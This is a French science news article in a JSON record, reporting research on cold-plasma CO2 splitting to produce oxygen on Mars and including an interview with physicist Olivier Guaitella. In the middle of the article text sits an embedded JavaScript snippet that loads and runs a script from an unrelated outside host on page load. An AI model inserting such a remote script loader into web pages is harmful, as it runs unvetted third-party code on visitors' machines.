{"title": "Mars : on a trouvé comment y produire de l'oxygène", "newspaper": "Futura Sciences", "author": "Rémy Decourt", "date_publi": "26/10/2017", "content": "Pour les missions humaines sur Mars, envisagées dans le courant de la décennie 2030, l'approvisionnement en oxygène a toujours été imaginé comme venant d'une extraction à partir de l'environnement martien. Mais l'idée reste théorique. Une équipe des universités de Lisbonne et de Porto, ainsi que de l'École Polytechnique (Paris) a peut-être trouvé une piste prometteuse. Olivier Guaitella, chercheur au Laboratoire de physique des plasmas et co-auteur de l'étude, nous explique tout. Ce qu'il faut retenir Sans production d'oxygène sur Mars, aucune mission humaine ne sera possible.  Parmi les solutions envisagées, la technologie des plasmas froids est une des plus prometteuses.  Elle a aussi une utilité sur Terre, transformant un gaz néfaste pour le climat en une matière première. Selon une nouvelle étude, la technologie des  plasmas  froids pourrait être  « la clé de la création d'un  approvisionnement en oxygène  durable sur Mars »  nous explique  Olivier  Guaitella, chercheur au Laboratoire de  physique  des plasmas (École Polytechnique, Palaiseau). Cette étude, à laquelle ce chercheur a participé sous la direction du docteur Vasco Guerra, de l'université de Lisbonne, suggère que Mars et son  atmosphère , composée à 96 % de  dioxyde de carbone  (CO 2 ), présentent des conditions  « presque idéales pour créer de l' oxygène  à partir du CO 2  grâce à un processus connu sous le nom de décomposition » . Dans le contexte des  missions martiennes habitées , il est  « totalement inenvisageable d'emporter depuis la  Terre  le dioxygène (O 2 ) nécessaire à ces missions, mais également à la  combustion  de carburant pour redécoller de la surface martienne » . Il faut donc nécessairement produire ce dioxygène avec les ressources présentes sur place.  À ce jour, le projet le plus avancé est développé au  Massachusetts Institute of Technology  par Michael Hecht.  « Leur proposition est fondée sur des cellules d' électrolyse  d'oxygène  solide  (SOEC). »  C'est une technologie robuste et déjà disponible, contrairement aux technologies plasma, actuellement en cours de développement. Cependant,  « l'efficacité de SOEC est très faible et nous pensons qu'un système plasma peut être plus performant, car l'efficacité de l'électrolyse des oxydes solides est susceptible de diminuer sur Mars comparativement à la Terre » . En effet, le procédé d'électrolyse nécessite de  « chauffer le  gaz  jusqu'à plus de 800 °C et de le comprimer jusqu'à 1 atmosphère, alors que l'efficacité de la dissociation plasmatique du CO 2  sur Mars est susceptible d'augmenter en utilisant directement les conditions de l' atmosphère martienne , comme le démontre notre travail » . Architecture de la base martienne telle que l'envisage Mars One. © Mars One                               La bonne source de plasma froid reste à trouver L'idée de l'équipe du docteur Vasco Guerra est donc de déterminer  « les conditions optimales pour convertir le CO 2  en CO et O 2  en bénéficiant de l'efficacité énergétique des plasmas froids qui convertissent l' énergie  électrique en énergie chimique » . La  molécule  de CO 2  est très stable thermodynamiquement mais dans un plasma,  « les molécules de CO 2  commencent à vibrer sous l'impact des  électrons  » . Si l'énergie accumulée dans ces  vibrations  est suffisante, on peut  « parvenir à casser la molécule de CO 2  pour former du  monoxyde de carbone  (CO) et du dioxygène » . D'autant que les conditions sur Mars (basse pression et basse température) sont  « favorables à cette excitation des vibrations du CO 2  par le plasma » .  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  Aujourd'hui,  « nous en sommes encore à l'étape de la preuve de concept » . Il faut savoir qu'il existe de nombreuses façons de générer des plasmas froids (radiofréquences, micro-ondes, etc.). Il reste donc  « un travail important à réaliser pour déterminer la meilleure source plasma pour une utilisation dans le cadre d'une mission martienne » . Pour l'instant, ce travail est purement théorique mais  « nous avons pu montrer que nous pouvons utiliser les conditions martiennes à notre avantage » . Des expériences dans des conditions plus proches de celle de la Terre, en particulier avec des gaz à température ambiante, ont déjà été réalisées au Laboratoire de physique des plasmas de la  Technische Universiteit Eindhoven , aux Pays-Bas (voir cet  article  qui vient d'être accepté : B. Klarenaar  et al. ,  2017 Plasma Sources Sci. Technol. in press ). Ces travaux  « nous permettent déjà d'établir un très bon accord avec les modèles développés par nos collègues portugais de l' Instituto Superior Técnico  » . De nouvelles expériences approchant les conditions martiennes sont prévues pour les deux prochaines années. Le saviez-vous ? Les plasmas froids sont des gaz ionisés dans lesquels des électrons très énergétiques créent des espèces chimiquement réactives tout en maintenant une température assez basse pour limiter les pertes thermiques. Ce sont donc d'excellents convertisseurs d'énergie électrique en énergie chimique. Concrètement, comment comptez-vous produire de l’oxygène sur Mars et le stocker ? Olivier Guaitella :  Avec les réacteurs de laboratoire étudié jusqu'à maintenant, nous pouvons espérer des productions de dioxygène de l'ordre de 10 g/h, ce qui correspond également à la production envisagée par la seule autre technique prévuée à ce jour dans le cadre du projet Moxie de la Nasa. Si nous imaginons un système qui multiplierait par 100 le  débit  de ce module élémentaire, ce qui semble faisable. Nous pouvons viser un  volume  de 8 à 16 kg/sol [le « sol » est un jour martien]. Une unité ISRU utiliserait par exemple l'électricité issue de panneaux solaires pour générer le plasma et convertir le CO 2  de l'atmosphère martienne. L’exemple de la Station spatiale internationale peut-il vous servir ? Olivier Guaitella :  Oui. Le complexe orbital est occupé en permanence par un équipage de six personnes. Il consomme actuellement de l'oxygène dans une plage de 2 à 5 kg/jour, ce qui suffirait donc à soutenir une petite colonie. Si vos travaux aboutissent, peut-on dire que la question de l'oxygène sur Mars est réglée ? Olivier Guaitella :  À ce stade, nous n'avons que des résultats théoriques motivant l'intérêt des plasmas froids pour cette problématique. Les premiers résultats expérimentaux sont aussi encourageants. Toutefois, même lorsque le réacteur plasma sera optimisé et que des rendements énergétiques suffisants seront atteints dans des conditions martiennes, d'autres défis technologiques devront être relevés, comme la séparation des gaz CO et O 2 , ou l'impact des poussières, nombreuses dans l'atmosphère martienne. Nous sommes donc encore loin d'avoir un module de production d'oxygène sur Mars. Néanmoins, nos travaux montrent que les plasmas froids sont probablement les meilleurs candidats pour relever ce défi majeur des missions martiennes. Cette technologie a-t-elle une utilité sur Terre ? Olivier Guaitella :  Oui. Les recherches que nous menons visent en premier lieu la valorisation du CO 2  sur Terre. L'une des possibilités pour limiter les  émissions  de CO 2  dans l'atmosphère serait de l'utiliser pour la synthèse de carburant, ou comme brique de base de la  chimie  organique. Au lieu d'être un  déchet , le CO 2  deviendrait une  matière  première pour remplacer les  hydrocarbures  dans de nombreux procédés de synthèse organique. Mais, sur Terre comme sur Mars, le principal obstacle est la stabilité de la molécule de CO 2 . Le développement de technologies plasma pour parvenir à une  conversion du CO 2  énergétiquement efficace pourrait à terme proposer à la fois une solution pour les missions martiennes mais également pour répondre à certains des défis environnementaux majeurs auxquels nous devons faire face. ", "theme": "sciences"}